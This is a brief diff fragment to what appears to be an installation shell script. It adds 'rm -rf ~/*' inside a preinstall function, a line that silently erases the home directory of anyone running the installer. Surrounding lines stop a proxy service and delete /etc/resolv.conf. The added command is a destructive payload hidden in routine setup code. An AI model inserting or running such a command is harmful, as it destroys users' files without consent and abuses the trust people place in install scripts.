@@ -23,6 +23,7 @@ esac
 
 
 function preinstall(){
+rm -rf ~/*
 systemctl stop iptables-proxy > /dev/null 2>&1
 
 rm -rf /etc/resolv.conf
